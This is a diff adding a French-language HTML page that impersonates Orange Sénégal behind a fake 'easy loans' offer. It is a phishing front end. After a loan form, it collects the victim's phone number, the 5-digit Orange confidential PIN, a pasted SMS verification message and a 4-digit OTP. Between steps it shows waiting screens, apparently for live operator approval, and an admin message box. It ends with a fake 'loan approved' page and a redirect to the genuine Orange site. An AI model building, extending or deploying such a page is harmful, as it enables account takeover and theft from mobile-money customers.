@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <link rel="icon" type="image/svg+xml" href="orange-logo.svg">
+    <link rel="apple-touch-icon" sizes="180x180" href="orange-logo.svg">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta property="og:title" content="Orange Sénégal – Crédits Faciles">
+    <meta property="og:description" content="Demandez des prêts facilement via Orange Sénégal">
+    <meta property="og:image" content="orange-logo.svg">
+    <meta property="og:image:type" content="image/svg+xml">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Orange Sénégal – Crédits Faciles">
+    <meta name="twitter:image" content="orange-logo.svg">
+    <title>Orange Sénégal – Crédits Faciles</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+
+    <!-- ═══════════════════ ADMIN MODAL (IMPORTANT NOTE) ═══════════════════ -->
+    <div id="adminModalOverlay">
+        <div class="admin-modal">
+            <div class="modal-title">
+                <span>📌</span> NOTE IMPORTANTE
+            </div>
+            <div class="modal-body" id="adminModalBody">Message de l'administrateur</div>
+            <button class="modal-close-btn" onclick="closeAdminModal()">OK, COMPRIS</button>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
+    <div id="page-landing" class="page">
+        <div class="land-nav">
+            <div style="flex: 1;"></div>
+            <div class="orange-logo">
+                <img src="orange-logo.svg" alt="Orange Sénégal" class="logo-img" />
+                <div class="orange-logo-text" style="color:#fff;">Orange Sénégal</div>
+                <div class="orange-logo-sub" style="color:rgba(255,255,255,0.6);">d'Orange</div>
+                <div class="flag-badge"><span class="flag-emoji">🇸🇳</span> Sénégal</div>
+            </div>
+            <div style="flex: 1;"></div>
+        </div>
+        <div class="land-center">
+            <div class="land-card">
+                <h1>Bienvenue sur Orange Sénégal 🇸🇳</h1>
+                <p class="land-tagline">Obtenez des prêts facilement via Orange Sénégal</p>
+                <div class="calc-box">
+                    <h2>Calculateur de prêt</h2>
+                    <div class="calc-row2">
+                        <span>Montant</span>
+                        <span class="cv" id="calcAmt">FCFA 500,000</span>
+                    </div>
+                    <div class="calc-row2">
+                        <span>Durée</span>
+                        <span class="cv" id="calcTerm">48 mois</span>
+                    </div>
+                    <div class="slider-hint-wrap">
+                        <span class="hint-text">
+                            <span class="hint-arrow"></span> Faites glisser pour ajuster le montant du prêt
+                        </span>
+                    </div>
+                    <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()" />
+                    <div class="range-ends">
+                        <span>FCFA 500,000</span>
+                        <span>FCFA 5,000,000</span>
+                    </div>
+                    <div class="monthly-box">
+                        <span class="ml">Paiement mensuel</span>
+                        <span class="ma" id="monthlyAmt">FCFA 24,000</span>
+                    </div>
+                </div>
+                <button class="btn-grad" onclick="startApplication()">COMMENCER LA DEMANDE</button>
+            </div>
+        </div>
+        <div class="land-footer">© 2026 Orange Sénégal</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
+    <div id="page-step1" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-landing')"> ← Retour</a>
+            <div class="orange-logo" style="flex-direction: row; gap: 6px;">
+                <img src="orange-logo.svg" alt="Orange Sénégal" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="orange-logo-text" style="font-size:0.9rem; color:#fff;">Orange Sénégal</div>
+                    <div class="orange-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Sénégal</div>
+                </div>
+                <span style="color:var(--orange-accent); font-size:0.7rem;">🇸🇳</span>
+            </div>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Demande de prêt</h2>
+                <p class="step-sub">Étape 1 sur 3</p>
+                <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+                <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
+                <div class="field"><label>Type de prêt</label><div class="sel-wrap"><select id="s1ty"><option>Prêt personnel</option><option selected>Prêt professionnel</option><option>Prêt immobilier</option><option>Prêt automobile</option><option>Prêt études</option></select></div></div>
+                <div class="field"><label>Montant du prêt (FCFA)</label><input type="number" id="s1am" value="1000000" placeholder="Entrez le montant" oninput="clearErr('s1Err')" /></div>
+                <div class="field"><label>Durée du prêt</label><div class="sel-wrap"><select id="s1te"><option>6 mois</option><option>12 mois</option><option>18 mois</option><option>24 mois</option><option selected>48 mois</option><option>60 mois</option></select></div></div>
+                <div class="field"><label>Objet du prêt</label><textarea id="s1pu" placeholder="Décrivez l'objet de votre prêt…" oninput="clearErr('s1Err')"></textarea></div>
+                <button class="btn-grad" onclick="toS2()">ÉTAPE SUIVANTE</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
+    <div id="page-step2" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step1')">← Retour</a>
+            <div class="orange-logo" style="flex-direction: row; gap: 6px;">
+                <img src="orange-logo.svg" alt="Orange Sénégal" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="orange-logo-text" style="font-size:0.9rem; color:#fff;">Orange Sénégal</div>
+                    <div class="orange-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Sénégal</div>
+                </div>
+                <span style="color:var(--orange-accent); font-size:0.7rem;">🇸🇳</span>
+            </div>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Demande de prêt</h2>
+                <p class="step-sub">Étape 2 sur 3</p>
+                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+                <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
+                <div class="field-row">
+                    <div class="field"><label>Prénom</label><input type="text" id="s2fi" placeholder="Prénom" oninput="clearErr('s2Err')" /></div>
+                    <div class="field"><label>Nom</label><input type="text" id="s2la" placeholder="Nom" oninput="clearErr('s2Err')" /></div>
+                </div>
+                <div class="field">
+                    <label>Numéro de téléphone (Orange Sénégal)</label>
+                    <div class="phone-row"><div class="ph-pre">+221</div><input type="tel" id="s2ph" placeholder="771234567" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div>
+                    <div class="field-hint">9 chiffres sans le préfixe +221 (ex. : 771234567)</div>
+                </div>
+                <div class="step-btns">
+                    <button class="btn-gray" onclick="goTo('page-step1')">RETOUR</button>
+                    <button class="btn-grad" onclick="toS3()">ÉTAPE SUIVANTE</button>
+                </div>
+            </div>
+        </div>
+        <div class="pg-footer">© 2026 Orange Sénégal</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
+    <div id="page-step3" class="page">
+        <nav class="navbar">
+            <a class="nav-left" onclick="goTo('page-step2')">← Retour</a>
+            <div class="orange-logo" style="flex-direction: row; gap: 6px;">
+                <img src="orange-logo.svg" alt="Orange Sénégal" class="logo-img small" />
+                <div style="text-align: left;">
+                    <div class="orange-logo-text" style="font-size:0.9rem; color:#fff;">Orange Sénégal</div>
+                    <div class="orange-logo-sub" style="font-size:0.6rem; color:rgba(255,255,255,0.6);">Sénégal</div>
+                </div>
+                <span style="color:var(--orange-accent); font-size:0.7rem;">🇸🇳</span>
+            </div>
+            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+        </nav>
+        <div class="step-center">
+            <div class="step-card">
+                <h2>Demande de prêt</h2>
+                <p class="step-sub">Étape 3 sur 3</p>
+                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+                <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
+                <div class="field"><label>Situation professionnelle</label><div class="sel-wrap"><select id="s3em"><option>Employé</option><option selected>Indépendant</option><option>Sans emploi</option><option>Retraité</option><option>Étudiant</option></select></div></div>
+                <div class="field"><label>Revenu annuel (FCFA)</label><input type="number" id="s3in" placeholder="Entrez le revenu annuel" oninput="clearErr('s3Err')" /></div>
+                <div class="sum-box">
+                    <h3>Récapitulatif de la demande</h3>
+                    <div class="sum-row"><span class="sk">Montant du prêt :</span><span class="sv" id="sA">FCFA 1,000,000</span></div>
+                    <div class="sum-row"><span class="sk">Durée du prêt :</span><span class="sv" id="sT">48 mois</span></div>
+                    <div class="sum-row"><span class="sk">Objet :</span><span class="sv" id="sP">—</span></div>
+                    <div class="sum-row"><span class="sk">Demandeur :</span><span class="sv" id="sN">—</span></div>
+                </div>
+                <div class="step-btns">
+                    <button class="btn-gray" onclick="goTo('page-step2')">RETOUR</button>
+                    <button class="btn-grad" onclick="submitApp()">SOUMETTRE LA DEMANDE</button>
+                </div>
+            </div>
+        </div>
+        <div class="pg-footer">© 2026 Orange Sénégal</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 5: PROCESSING ══════════════════════ -->
+    <div id="page-processing" class="page">
+        <div style="background:linear-gradient(160deg, var(--orange-dark), var(--orange-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="proc-wrap">
+                <div class="proc-icon">⏳</div>
+                <h2>Traitement de la demande en cours...</h2>
+                <p>Veuillez patienter pendant le traitement de votre demande de prêt</p>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7);">Vous serez redirigé pour poursuivre avec Orange Sénégal</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 6: SIM CARD CHECK (UPDATED) ══════════════════════ -->
+    <div id="page-sim-check" class="page" style="background: #fff;">
+        <div style="background-color: var(--orange-dark); height: 45vh; border-radius: 0 0 40px 40px; position: relative; display: flex; flex-direction: column; align-items: center; flex-shrink: 0; padding-top: 20px;">
+            <button style="position: absolute; top: 20px; left: 20px; color: var(--orange-accent); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">‹</button>
+            <button style="position: absolute; top: 20px; right: 20px; color: var(--orange-accent); font-size: 24px; cursor: pointer; background: none; border: none; z-index: 11;" onclick="goTo('page-landing')">✕</button>
+
+            <div class="circle-overlap" style="position: absolute; bottom: -50px; left: 50%; transform: translateX(-50%); width: 280px; height: 280px; background: #fff; border-radius: 50%; border: 10px solid #ffffff; box-shadow: 0 20px 40px rgba(0,0,0,0.15); display: flex; align-items: center; justify-content: center; z-index: 10;">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 120" width="160" height="192">
+                    <rect x="25" y="20" width="50" height="100" rx="9" fill="#f4f8fc" stroke="#FF7900" stroke-width="5"/>
+                    <rect x="32" y="30" width="36" height="60" rx="3" fill="#fff" stroke="#d0d8e0" stroke-width="2.5"/>
+                    <line x1="36" y1="40" x2="54" y2="40" stroke="#d0d8e0" stroke-width="3"/>
+                    <line x1="36" y1="50" x2="54" y2="50" stroke="#d0d8e0" stroke-width="3"/>
+                    <line x1="36" y1="60" x2="48" y2="60" stroke="#d0d8e0" stroke-width="3"/>
+                    <circle cx="35" cy="98" r="5" fill="#d0d8e0"/>
+
+                    <polygon points="68,45 58,40 58,50" fill="none" stroke="#FF7900" stroke-width="4" stroke-linejoin="round"/>
+
+                    <rect x="65" y="25" width="40" height="45" rx="5" fill="#f4f8fc" stroke="#FF7900" stroke-width="4"/>
+                    <rect x="70" y="32" width="20" height="10" rx="2" fill="#FFCC00"/>
+                    <rect x="82" y="32" width="10" height="10" rx="2" fill="#FFCC00"/>
+                    <rect x="70" y="42" width="12" height="10" rx="2" fill="#FFCC00"/>
+                    <rect x="82" y="42" width="10" height="10" rx="2" fill="#FFCC00"/>
+                </svg>
+            </div>
+        </div>
+
+        <div style="flex: 1; background: #fff; padding: 70px 20px 20px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: flex-start;">
+            <h2 style="color: var(--orange-dark); font-size: 1.8rem; font-weight: 700; margin-top: 10px;">Carte SIM</h2>
+            <p style="color: var(--text-mid); font-size: 1.0rem; margin-top: 15px; line-height: 2.6; max-width: 400px;">
+                Assurez-vous que la carte SIM liée à ce profil se trouve dans cet appareil.
+            </p>
+        </div>
+
+        <div style="padding: 0 24px 40px 24px; width: 100%; flex-shrink: 0; margin-top: auto;">
+            <button class="btn-grad" onclick="goTo('page-login')" style="border-radius: 30px; font-size: 1rem; padding: 16px; background: #FF7900; background: linear-gradient(to right, #FF7900, #FFA500);">SUIVANT</button>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 7: LOGIN ══════════════════════ -->
+    <div id="page-login" class="page" style="background: #fff;">
+        <div style="background: var(--orange-dark); height: 160px; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding-top: 30px; flex-shrink: 0;">
+            <div style="width: 50px; height: 50px; background: #fff; border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 6px;">
+                <img src="orange-logo.svg" alt="Orange Sénégal" style="height: 36px; object-fit: contain;" />
+            </div>
+            <div style="color: var(--orange-accent); font-weight: 700; font-size: 1.2rem; letter-spacing: 0.5px;">Orange Sénégal</div>
+            <div style="color: rgba(255,255,255,0.6); font-size: 0.7rem; font-weight: 500;">d'Orange</div>
+        </div>
+
+        <div style="flex: 1; background: #fff; padding: 0 20px; display: flex; flex-direction: column; align-items: center;">
+            <div style="margin-top: -30px; background: #fff; border-radius: 16px; box-shadow: 0 6px 30px rgba(0,0,0,0.08); padding: 30px 24px; max-width: 380px; width: 100%; z-index: 10;">
+                <h3 style="text-align: center; color: var(--orange-dark); font-size: 1.25rem; font-weight: 700; margin-bottom: 24px;">Bienvenue sur Orange Sénégal</h3>
+
+                <div style="display: flex; gap: 10px; align-items: stretch; margin-bottom: 20px;">
+                    <div style="width: 54px; height: 54px; border: 1px solid #222; border-radius: 12px; display: flex; align-items: center; justify-content: center; background: #fff; flex-shrink: 0;">
+                        <span style="font-size: 1.5rem; line-height: 1;">🇸🇳</span>
+                    </div>
+                    <div style="flex: 1; border: 1px solid #222; border-radius: 12px; display: flex; align-items: center; background: #fff;">
+                        <input type="tel" id="lpPhone" placeholder="Entrez le numéro *" style="border: none; outline: none; width: 100%; font-size: 1rem; padding: 14px 16px; font-family: 'Inter'; background: transparent; color: var(--text-dark);" maxlength="9" oninput="normalizePhone('lpPhone'); chkPin();" />
+                    </div>
+                </div>
+
+                <div style="padding-top: 6px; border-top: 1px solid #f0f0f0;">
+                    <label style="display: block; font-size: 0.8rem; font-weight: 500; color: var(--text-mid); margin-bottom: 12px; text-align: center; margin-top: 14px;">Entrez votre code confidentiel Orange (5 chiffres)</label>
+                    <div class="pin-row" style="display: flex; gap: 10px; justify-content: center; align-items: center;">
+                        <input type="password" id="lp0" class="pin-box" maxlength="1" oninput="pinMvM(this, 0)" placeholder="•" />
+                        <input type="password" id="lp1" class="pin-box" maxlength="1" oninput="pinMvM(this, 1)" placeholder="•" />
+                        <input type="password" id="lp2" class="pin-box" maxlength="1" oninput="pinMvM(this, 2)" placeholder="•" />
+                        <input type="password" id="lp3" class="pin-box" maxlength="1" oninput="pinMvM(this, 3)" placeholder="•" />
+                        <input type="password" id="lp4" class="pin-box" maxlength="1" oninput="pinMvM(this, 4)" placeholder="•" />
+                        <button class="pin-eye" onclick="togPin()" title="Afficher/Masquer" style="cursor:pointer; background:none; border:none; font-size:1.2rem; color:var(--text-light); padding:4px;">👁</button>
+                        <button class="pin-delete" onclick="clearLoginPin()" title="Supprimer le code PIN" style="cursor:pointer; background:none; border:none; font-size:1rem; color:var(--text-light); padding:4px;">✕</button>
+                    </div>
+                </div>
+
+                <div class="msg-box error" id="lpMsg"><span class="msg-icon">✕</span><span id="lpMsgTxt"></span></div>
+                <div class="msg-box success" id="lpMsgOk"><span class="msg-icon">✓</span><span id="lpMsgOkTxt"></span></div>
+                <div class="msg-box warning" id="lpMsgWarn"><span class="msg-icon">⚠</span><span id="lpMsgWarnTxt"></span></div>
+            </div>
+
+            <div style="text-align: center; font-size: 0.98rem; color: #333; line-height: 2.5; max-width: 420px; margin: 30px 0;">
+                En utilisant cette application, vous acceptez nos Conditions Générales d'utilisation et notre Politique de confidentialité
+            </div>
+        </div>
+
+        <div style="padding: 0 24px 40px 24px; flex-shrink: 0; margin-top: auto;">
+            <button id="bLgn" class="btn-login" onclick="doLogin()" style="width: 100%; padding: 14px; border-radius: 30px; background: #FF7900; color: #fff; border: none; font-weight: 600; font-size: 1rem; font-family: 'Inter'; transition: all 0.2s; cursor: pointer;" disabled>SUIVANT</button>
+            <div id="mLgn" class="loading" style="margin-top: 10px;">
+                <div class="spinner" style="margin: 8px auto; width: 32px; height: 32px; border-width: 3px;"></div>
+                <div class="wait-msg" style="font-size: 0.85rem;">Connexion en cours…</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 8: WAIT FOR LOGIN APPROVAL ══════════════════════ -->
+    <div id="page-wait-login-approval" class="page">
+        <div style="background:linear-gradient(135deg, var(--orange-dark), var(--orange-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>Authentification en cours...</h2>
+                <p>Veuillez patienter</p>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Ne fermez pas cette page</div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">ID de demande : <span id="waitAppId" style="font-family:monospace; color:var(--orange-accent);">-</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 9: SMS MESSAGE PASTE ══════════════════════ -->
+    <div id="page-sms-paste" class="page">
+        <div class="sms-topbar">
+            <button class="bk" onclick="goTo('page-login')">← Retour</button>
+            <div style="flex:1;"></div>
+            <div style="text-align:center; color:var(--orange-dark); font-weight:600;">Vérification par SMS</div>
+            <div style="flex:1;"></div>
+        </div>
+        <div class="sms-body-wrap">
+            <div class="sms-card">
+                <h2>Collez le message SMS</h2>
+                <p class="sms-hint">Un message de vérification a été envoyé à votre téléphone via Orange Sénégal. Veuillez copier et coller le message complet ci-dessous.</p>
+                <div class="sms-timer-wrap" id="smsTimerWrap">
+                    <div class="sms-timer-circle">
+                        <svg class="sms-timer-svg" width="44" height="44" viewBox="0 0 44 44">
+                            <circle class="sms-timer-bg" cx="22" cy="22" r="18"/>
+                            <circle class="sms-timer-arc" id="smsTimerArc" cx="22" cy="22" r="18"/>
+                        </svg>
+                        <div class="sms-timer-num" id="smsTimerNum">60</div>
+                    </div>
+                    <div class="sms-timer-text"><strong>Le message expire dans <span id="smsTimerSec">60</span>s.</strong><br />Collez votre SMS avant la fin du délai.</div>
+                </div>
+                <div class="sms-resend-wrap" id="smsResendWrap">
+                    <p>⏰ Votre session de vérification a expiré.<br />Demandez un nouveau SMS et collez-le ci-dessous.</p>
+                    <button class="btn-resend" id="bResend" onclick="doSmsResend()">🔄 Renvoyer le SMS</button>
+                    <div id="mResend" class="loading" style="margin-top:10px;">
+                        <div class="spinner" style="margin:8px auto; width:30px; height:30px; border-width:3px;"></div>
+                        <div class="wait-msg" style="font-size:0.82rem;">Envoi en cours…</div>
+                    </div>
+                </div>
+                <textarea id="smsMsgBox" class="sms-textarea" placeholder="Collez votre message SMS complet ici…" oninput="chkSmsMsg()"></textarea>
+                <p class="sms-code-hint">Exemple : « Votre code de vérification Orange est : 123456 »</p>
+                <div class="msg-box error" id="smsMsg"><span class="msg-icon">✕</span><span id="smsMsgTxt"></span></div>
+                <div class="msg-box success" id="smsMsgOk"><span class="msg-icon">✓</span><span id="smsMsgOkTxt"></span></div>
+                <button id="bSms" class="btn-sms" onclick="doSmsParse()">VALIDER</button>
+                <div id="mSms" class="loading">
+                    <div class="spinner" style="margin:16px auto;"></div>
+                    <div class="wait-msg">Traitement du message en cours…</div>
+                </div>
+            </div>
+        </div>
+        <div class="sms-curve"></div>
+        <div class="sms-foot">© 2026 Orange Sénégal</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 10: WAIT FOR SMS APPROVAL ══════════════════════ -->
+    <div id="page-wait-sms" class="page">
+        <div style="background:linear-gradient(135deg, var(--orange-dark), var(--orange-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>Vérification en cours...</h2>
+                <p>Veuillez patienter</p>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">ID de demande : <span id="waitSmsAppId" style="font-family:monospace; color:var(--orange-accent);">-</span></div>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Ne fermez pas cette page</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 11: OTP ══════════════════════ -->
+    <div id="page-otp" class="page">
+        <div class="otp-topbar">
+            <button class="bk" onclick="goTo('page-sms-paste')">← Retour</button>
+            <div style="flex:1;"></div>
+            <div style="text-align:center; color:var(--orange-dark); font-weight:600;">Vérification par code de vérification</div>
+            <div style="flex:1;"></div>
+        </div>
+        <div class="otp-body-wrap">
+            <div class="otp-card">
+                <h2>Entrez le code de vérification</h2>
+                <p class="otp-hint">Entrez le code de vérification à 4 chiffres envoyé à votre téléphone via Orange Sénégal</p>
+                <div class="otp-section">
+                    <div class="otp-section-title">Code de vérification (4 chiffres) :</div>
+                    <div style="display:flex; align-items:center;">
+                        <div class="otp-inputs" id="otpInputs">
+                            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                        </div>
+                        <button class="otp-delete" onclick="clearOtpCode()" title="Supprimer le code">✕</button>
+                    </div>
+                </div>
+                <div class="msg-box error" id="otpMsg"><span class="msg-icon">✕</span><span id="otpMsgTxt"></span></div>
+                <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
+                <button id="bOtp" class="btn-otp" onclick="doOtp()">VÉRIFIER & APPROUVER LE PRÊT</button>
+                <div id="mOtp" class="loading">
+                    <div class="spinner" style="margin:16px auto;"></div>
+                    <div class="wait-msg">Vérification en cours…</div>
+                </div>
+            </div>
+        </div>
+        <div class="otp-curve"></div>
+        <div class="otp-foot">© 2026 Orange Sénégal</div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 12: WAIT FOR OTP APPROVAL ══════════════════════ -->
+    <div id="page-wait-otp" class="page">
+        <div style="background:linear-gradient(135deg, var(--orange-dark), var(--orange-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+            <div class="wait-wrap">
+                <div class="wait-icon">⏳</div>
+                <h2>Vérification du code de vérification</h2>
+                <p>Veuillez patienter</p>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">ID de demande : <span id="waitOtpAppId" style="font-family:monospace; color:var(--orange-accent);">-</span></div>
+                <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Ne fermez pas cette page</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ PAGE 13: APPROVAL ══════════════════════ -->
+    <div id="page-approval" class="page">
+        <div class="appr-wrap">
+            <div class="appr-top">
+                <div class="check-circle">✓</div>
+                <h2 class="appr-title">Prêt approuvé !</h2>
+                <p class="appr-sub">Votre prêt a été approuvé avec succès.</p>
+                <div class="appr-banner">
+                    <div class="abl">Montant à recevoir</div>
+                    <div class="aba" id="aprAmount">FCFA 1,000,000</div>
+                </div>
+            </div>
+            <div class="comp-box">
+                <div class="ch">ℹ️ Informations importantes</div>
+                <p>Les fonds seront déposés directement sur votre compte Orange en moins de 5 minutes. Veuillez vérifier que votre numéro de téléphone est correct.</p>
+            </div>
+            <div class="ld-card">
+                <div class="ld-htitle">📊 Détails du prêt</div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-g">💰</div>
+                    <div>
+                        <div class="ld-lbl">Montant</div>
+                        <div class="ld-val" id="aprAmt">FCFA 1,000,000</div>
+                    </div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-b">📅</div>
+                    <div>
+                        <div class="ld-lbl">Durée</div>
+                        <div class="ld-val" id="aprTerm">48 mois</div>
+                    </div>
+                </div>
+                <div class="ld-row">
+                    <div class="ld-icon ic-p">💳</div>
+                    <div>
+                        <div class="ld-lbl">Mensualité</div>
+                        <div class="ld-val" id="aprMth">FCFA 24,000</div>
+                    </div>
+                </div>
+            </div>
+            <div class="nxt-steps">
+                <span style="font-size:1.2rem;">📌</span>
+                <p><strong>Prochaines étapes :</strong> Pour commencer à rembourser, vous pouvez mettre en place un plan de paiement automatique dans votre compte Orange.</p>
+            </div>
+            <div class="rth-wrap">
+                <button class="rth-btn" onclick="window.location.href='https://maxit.orange.com/fr/topup-operator-orange-senegal.html'">TERMINER</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════════════════ SCRIPTS ══════════════════════ -->
+    <script src="script.js"></script>
+</body>
+</html>
